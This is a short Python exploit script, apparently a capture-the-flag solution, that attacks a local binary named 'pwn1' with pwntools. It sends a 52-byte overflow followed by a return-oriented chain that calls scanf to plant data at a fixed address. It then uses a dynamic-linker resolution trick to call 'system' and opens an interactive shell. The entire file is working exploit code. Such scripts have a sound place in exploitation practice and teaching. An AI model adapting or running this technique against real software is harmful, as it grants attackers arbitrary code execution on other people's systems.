from pwn import *
from roputils import ROP

def packAll(rop):
    return flat([p32(x) for x in rop])

r = process('./pwn1')
e = ELF('./pwn1')
e2 = ROP('./pwn1')

fmt = 0x8048629
buf = 0x804a100
pp = 0x080485ee
sh = 0x804928e

rop = [e.plt['__isoc99_scanf'], pp, fmt, buf]
r.sendlineafter('pwn test\n', 'A'*52+packAll(rop)+e2.dl_resolve_call(buf, sh))

data = e2.dl_resolve_data(buf, 'system')
r.sendline(data)

r.interactive()
